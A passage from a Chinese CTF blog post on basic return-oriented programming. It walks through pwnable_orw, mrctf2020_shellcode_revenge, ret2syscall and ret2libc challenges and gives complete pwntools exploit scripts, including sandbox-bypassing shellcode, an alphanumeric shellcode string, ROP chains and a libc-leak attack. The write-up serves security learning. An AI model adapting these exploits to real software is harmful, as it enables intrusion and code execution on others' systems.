class="number">0x24</span>,<span class="string">b&#x27;\x90&#x27;</span>)+p32(hint_addr)+shell</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h4><p>开启了沙箱保护</p>
<p><img src="../../img/image-20231219200625685.png" alt="image-20231219200625685"></p>
<p>可以看到开启了<code>沙箱保护</code>，这里沙箱保护会限制我们可以执行的系统调用。从汇编代码中我们可以看到执行了注入的<code>shellcode</code>，可以被执行的系统调用如下。</p>
<p><img src="../../img/image-20231219204403313.png" alt="image-20231219204403313"></p>
<p>可以用汇编实现<img src="../../img/image-20231219223531623.png" alt="image-20231219223531623"></p>
<p>payload1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29831</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">mov eax,0x5;</span></span><br><span class="line"><span class="string">push ecx;		#&#x27;/0&#x27;截断字符</span></span><br><span class="line"><span class="string">push 0x67616c66;	#flag</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">xor edx,edx;	#将 edx 寄存器清零，表示在打开文件时不设置权限（mode）</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sys_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x3;</span></span><br><span class="line"><span class="string">mov ecx,0x0804A127;    #shellcod最后字节向前覆盖</span></span><br><span class="line"><span class="string">mov ebx,0x3;			#fd=3</span></span><br><span class="line"><span class="string">mov dl,0x40;			</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x4;</span></span><br><span class="line"><span class="string">mov bl,0x1;	    #fd=1</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(sys_open)+asm(sys_read)+asm(sys_write)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give my your shellcode:&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A127</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A127</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>fd</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>stdin</td>
</tr>
<tr>
<td>1</td>
<td>stdout</td>
</tr>
<tr>
<td>2</td>
<td>stderr</td>
</tr>
</tbody>
</table>
</div>
<p>注意本题的环境为<code>ubuntu16</code>，<code>bss段</code>是可执行的，较高版本的则不行。</p>
<h4 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h4><p>限制了输入字符<img src="../../img/image-20231220185502889.png" alt="image-20231220185502889"></p>
<p>可以使用<code>alpha3</code>来生成shellcode</p>
<blockquote>
<p>python ./ALPHA3.py x64 ascii mixedcase rax —input=”存储shellcode的文件”</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./mrctf2020_shellcode_revenge&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29257</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r.recvuntil(&quot;Show me your magic!\n&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">r.send(payload)  <span class="comment">#回车不在合法范围内</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="jarvisoj——level1"><a href="#jarvisoj——level1" class="headerlink" title="jarvisoj——level1"></a>jarvisoj——level1</h4><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><img src="../../img/image-20231205222704106.png" alt="image-20231205222704106"></p>
<p><img src="../../img/image-20231206224304713.png" alt="image-20231206224304713"></p>
<p><img src="../../img/image-20231206224403111.png" alt="image-20231206224403111"></p>
<p>ida字符串搜索发现<code>/bin/sh</code>系统调用，地址为<code>0x80be408需要工具</code>ROPgadget`</p>
<p><img src="../../img/image-20231229134025593.png" alt="image-20231229134025593"></p>
<h5 id="找出修改的寄存器"><a href="#找出修改的寄存器" class="headerlink" title="找出修改的寄存器"></a>找出修改的寄存器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="../../img/image-20231206223432914.png" alt="image-20231206223432914"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="../../img/image-20231206224119824.png" alt="image-20231206224119824"></p>
<p><img src="../../img/image-20231208201354573.png" alt="image-20231208201354573"></p>
<p>构建rop链，其中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="../../img/image-20231208203302563.png" alt="image-20231208203302563"></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#A1uGv">Basic-ROP (yuque.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ATFWUS/article/details/104565483">ROP-基础-ret2libc2_ret2libc2下载-CSDN博客</a></p>
<h4 id="过程链接表（PLT）和全局偏移量表（GOT）"><a href="#过程链接表（PLT）和全局偏移量表（GOT）" class="headerlink" title="过程链接表（PLT）和全局偏移量表（GOT）"></a>过程链接表（PLT）和全局偏移量表（GOT）</h4><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。</p>
<p><img src="../../img/image-20231207230527415.png" alt="image-20231207230527415"></p>
<p>总结一下，假设我们用调用<code>addvec</code>函数，首先进入PLT[2]。若为第<code>1</code>次调用，进行动态链接，然后把控制传递给addvec。第<code>n（n&gt;1)</code>调用由于<code>addvec</code>函数已经被加载到内存中确定的位置，则会从直接从PLT表跳转到GOT表中，在GOT表中进行函数调用。<br/></p>
<p><code>.got.plt</code>表用来表示<code>函数地址</code></p>
<p> 由于libc 的延迟绑定机制，我们需要泄露已经执行过的函数地址。</p>
<p><code>plt</code>在代码段，<code>got</code>在数据段</p>
<p><code>plt</code>是代码的填写者，<code>got</code>是代码的保存者</p>
<h4 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h4><blockquote>
<p>“/bin/sh”字符串和system函数都可以在程序找到</p>
</blockquote>
<p>通过IDAPro使用快捷键<code>ctrl+s</code>查找plt表上的system函数</p>
<p><img src="../../img/image-20231207232712108.png" alt="image-20231207232712108"></p>
<p>查找<code>/bin/sh</code></p>
<p><img src="../../img/image-20231208202603286.png" alt="image-20231208202603286"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&quot;./ret2libc1&quot;)</span></span><br><span class="line"><span class="comment">#system_plt=elf.plt[&quot;system&quot;]</span></span><br><span class="line"><span class="comment">#binsh_addr=next(elf.Search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>​        </p>
<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><blockquote>
<p>找不到”/bin/sh”字符串</p>
</blockquote>
<p>两种wp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048490</span></span><br><span class="line">gets_addr=<span class="number">0x08048460</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#buf2_addr=elf.symbols[&quot;buf2&quot;]</span></span><br><span class="line">payload=flat([<span class="number">112</span>*<span class="string">b&#x27;a&#x27;</span>,gets_addr,sys_addr,buf2_addr,buf2_addr])</span><br><span class="line"><span class="comment">#gets地址</span></span><br><span class="line"><span class="comment">#system地址（也是gets的返回地址）</span></span><br><span class="line"><span class="comment">#buf2（是gets的参数）</span></span><br><span class="line"><span class="comment">#buf2（是system的参数）</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">                                                                                                   </span><br></pre></td></tr></table></figure>
<p>此处的<code>ebx</code>用于调整栈结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048490</span></span><br><span class="line">gets_addr=<span class="number">0x08048460</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x0804843d</span></span><br><span class="line">payload=flat([<span class="number">112</span>*<span class="string">b&#x27;a&#x27;</span>,gets_addr,pop_ebx_addr,buf2_addr,sys_addr,<span class="string">&#x27;AAAA&#x27;</span>,buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h4><blockquote>
<p>都找不到</p>
</blockquote>
<p>泄露libc地址，通过偏移计算出字符串地址</p>
<p>_start函数有一句and esp, 0FFFFFFF0h进行了堆栈平衡</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">#main_addr = 0x080484D0</span><br><span class="line">start_addr = 0x08048618</span><br><span class="line">put_plt = 0x08048460</span><br><span class="line">libc_main_addr = 0x0804A024</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = 112 * b&#x27;a&#x27; + p32(put_plt) + p32(start_addr) + p32(libc_main_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_real_addr = u32(sh.recv(4))</span><br><span class="line"></span><br><span class="line">print (&quot;real_addr is:&quot; + hex(libc_real_addr))</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">addr_base = libc_real_addr - 0x018540</span><br><span class="line"></span><br><span class="line">system_addr = addr_base + 0x03a940</span><br><span class="line">string_addr = addr_base + 0x15902b</span><br><span class="line"></span><br><span class="line">print (&quot;system addr is:&quot; + hex(system_addr))</span><br><span class="line">print (&quot;string_addr is:&quot; + hex(string_addr))</span><br><span class="line"></span><br><span class="line">payload = 104 * b&#x27;a&#x27; + p32(system_addr) + 4*b&#x27;a&#x27; + p32(string_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-6597.html">一步一步学ROP之linux_x86篇 | WooYun知识库 (xmd5.com)</a>    </p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/137144976">基本ROP讲解 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5092d6d5caa3">彻底搞清楚 GOT 和 PLT - 简书 (jianshu.com)</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://randolfluo.github.io">Randolf luo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://randolfluo.github.io/2023/12/23/pwn/%E5%9F%BA%E7%A1%80rop/">http://randolfluo.github.io/2023/12/23/pwn/%E5%9F%BA%E7%A1%80rop/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://randolfluo.github.io" target="_blank">Randolfluo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/cover2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2023/12/19/buuctf_re_WP/%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRe/" title="红帽杯easyre"><img class="cover" src="/img/cover3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">红帽杯easyre</div></div><div class="info-2"><div class="info-item-1">step1，通过字符串查找突破口，发现疑似base64加密的字符串，进入交叉引用查看主函数。   12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int result; // eax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  __int64 v9; // rax  __int64 v10; // rax  __int64 v11; // rax  __int64 v12; // rax  __int64...</div></div></div></a><a class="pagination-related" href="/2023/12/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%A6%82%E8%BF%B0/" title="第1章——概述"><img class="cover" src="/img/cover1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">第1章——概述</div></div><div class="info-2"><div class="info-item-1"> start计算机网络（简称为网络）由若干结点(node)和连接这些结点的链路(link)组成。 互联网具有两个重要基本特点，即连通性和共享（资源共享） 计算机网络发展的三个阶段    年份 阶段     1969年 从单个网络ARPANET向互联网发展的过程   1985年 是建成了三级结构的互联网NSFNET   1993年 逐渐形成了多层次的ISP结构的互联网。（主干ISP，地区ISP，本地ISP）     互联网交换点IXP 主要作用就是允许两个网络直接相连并交换分组， 而不需要再通过第三个网络来转发分组。 www20世纪90年代，由欧洲原子核研究组织CERN开发的万维网WWW (World Wide Web)被广泛使用在互联网上。 互联网标准Step1:互联网草案(Internet Draft) Step2: 建议标准( Proposed Standard)  Step3:互联网标准(Internet Standard)     Step      互联网草案(Internet Draft) 有效期6个月   建议标准( Proposed...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/01/20/buuctf_pwn/get_started_3dscft_2016/" title="get_started_3dsctf_2016"><img class="cover" src="/img/cover1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-20</div><div class="info-item-2">get_started_3dsctf_2016</div></div><div class="info-2"><div class="info-item-1">#栈溢出，查看漏洞函数。  我们可以直接将程序控制流转移到打开文件来绕过if语句 exp123456789from pwn import *#sh= remote(&quot;node5.buuoj.cn&quot;,26045)sh = process(&#x27;./get_started_3dsctf_2016&#x27;)addr=0x080489b8offset = 56payload =...</div></div></div></a><a class="pagination-related" href="/2024/01/21/buuctf_pwn/jarvisoj_level2/" title="jarvisoj_level2"><img class="cover" src="/img/cover1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-21</div><div class="info-item-2">jarvisoj_level2</div></div><div class="info-2"><div class="info-item-1"># 这题其实蛮简单的但是涉及到了gdb的多线程调试，故记录一下。 尝试gdb调试，提示gdb开始调试子进程，然后子进程退出，打开ida查看一下，可以看到在vulnerable_function()中，在system(&quot;echo Input:&quot;);才进入漏洞函数，那么我们就需要又  由于system函数会打开一个shell执行命令，会folk一个子进程，因此我们需要使gdb一只调试主进程，  gdb多线程调试常用操作 GDB调试多进程的命令介绍和演示 - 刘跑跑 - 博客园 (cnblogs.com)     info inferiors 查看所有进程     inferiors 2 切换到编号为2的进程   detach inferiors 2 detach掉编号为2的进程   kill inferiors 2 kill掉编号为2的进程   set follow-fork-mode parent 只调试父进程（GDB默认）   set follow-fork-mode child 只调试子进程   show...</div></div></div></a><a class="pagination-related" href="/2024/05/24/others/%E7%BD%91%E5%AE%89%E8%AF%BE%E8%AE%BE/" title="栈溢出攻击原理与防范"><img class="cover" src="/img/cover3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-24</div><div class="info-item-2">栈溢出攻击原理与防范</div></div><div class="info-2"><div class="info-item-1">栈溢出攻击原理与防范栈溢出（又名stack overflow），指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。 [toc] 为什么栈溢出如此知名 莫里斯蠕虫  莫里斯蠕虫病毒利用了栈溢出漏洞 莫里斯蠕虫（Morris Worm）是在1988年11月2日由罗伯特·泰潘·莫里斯（Robert Tappan Morris）编写的一个计算机蠕虫。导致数千台计算机瘫痪，造成了大量的时间和金钱损失。他也是第一个因计算机犯罪而被判有罪的人。   stack overflow 论坛logo：全球知名的程序员论坛     漏洞发现至今已有35年，缓冲区溢出漏洞仍占比最多：   demo什么是栈溢出，请看如下demo： 12345678910#include&lt;stdio.h&gt;int main()&#123;    char s[10];    gets(s);    ...</div></div></div></a><a class="pagination-related" href="/2023/12/18/pwn/canary_pie/" title="canary_pie"><img class="cover" src="/img/cover3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-18</div><div class="info-item-2">canary_pie</div></div><div class="info-2"><div class="info-item-1">canary_pieStack Canaries (取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用）是一种用于对抗栈溢出攻击的技术。 其原理是在的入口处，从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致。  Canary bypass的姿势格式化字符串绕过canany 通过格式化字符串读取canary的值  Canary爆破(针对有fork函数的程序) fork作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序崩溃了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary  Stack smashing(故意触发canary_ssp leak)劫持_stack_chk_fail 修改got表中 stack chk fail函数的地址，在栈溢出后执行该函数，但由于该函数的地址被修改，所以程序会跳转到我们想要执行的地址  </div></div></div></a><a class="pagination-related" href="/2024/01/23/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串"><img class="cover" src="/img/cover2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-23</div><div class="info-item-2">格式化字符串</div></div><div class="info-2"><div class="info-item-1">C语言变参函数1man 3 printf //查看C语言格式化字符串   格式化字符串 $第n个参数%s变量所对应地址的内容%p获取对应栈的内存%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。hn(half int) hhn(half half int) 1.找到偏移值 通过fmtarg 来判断某个参数的偏移。 2.任意地址写入 3.  -&gt;RELRO-&gt;got表项-&gt;一般改printf函数 栈 one_gadget malloc_hook:printf参数超过 %43$p —&gt;调用 malloc iofile  jarvisoj_fm1关闭PIE，我们可以直接将x的地址写入后用%n修改所指的变量。buf为栈上第11个参数  1234567891011121314#!/usr/bin/env pythonfrom pwn import...</div></div></div></a><a class="pagination-related" href="/2023/12/29/buuctf_re_WP/CrackRTF/" title="CrackRTF"><img class="cover" src="/img/cover1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-29</div><div class="info-item-2">CrackRTF</div></div><div class="info-2"><div class="info-item-1">CrackRTF 函数atoi将输入的字符串化为整型，同时限定了v7为长度为6的字符串，因此我门可以尝试爆破，sub_401230有标识符0x8004u,判断为sha1 12345678910import hashlibstring=&#x27;@DBApp&#x27;for i in range(100000,999999):    flag=str(i)+string    x = hashlib.sha1(flag.encode(&quot;utf8&quot;))    y = x.hexdigest()    if &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot; == y:        print(flag)        break 123321@DBApp  passwd（2）只限定了输入的长度，有 95^6种可能 (可见字符),显然无法直接爆破。  在sub_4014D0我们发现了 hResInfo = FindResourceA(0, (LPCSTR)0x65,...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avater.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Randolf luo</div><div class="author-info-description">今日事，今日毕</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div 